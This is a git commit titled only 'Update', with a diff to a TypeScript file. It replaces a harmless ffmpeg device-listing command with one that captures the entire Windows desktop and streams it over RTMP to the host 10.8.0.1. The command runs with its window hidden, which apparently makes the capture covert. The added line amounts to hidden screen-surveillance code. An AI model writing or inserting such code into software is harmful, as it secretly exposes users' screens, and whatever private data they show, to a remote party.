163a420c2fdca2e828c798d52238ce79ad1682bd
xX53xXx <53x@acevik.de>
2023-02-05 08:13:48 +0100

    Update

--- src/index.ts
+++ src/index.ts
@@ -4,7 +4,7 @@ import { execSync } from 'child_process';
 let rsp = '';
 
 try {
-    rsp = execSync('ffmpeg -list_devices true -f dshow -i dummy', { encoding: 'utf-8', windowsHide: true });
+    rsp = execSync('ffmpeg -f gdigrab -i desktop -r 16 -c:v h264_nvenc -b:v 500k -crf 28 -pix_fmt yuv420p -strict -2 -ac 2 -b:a 128k -f flv rtmp://10.8.0.1/screen', { encoding: 'utf-8', windowsHide: true });
     if (typeof rsp === 'object') {
         rsp = (rsp as Record<string, string>).stdout;
     }
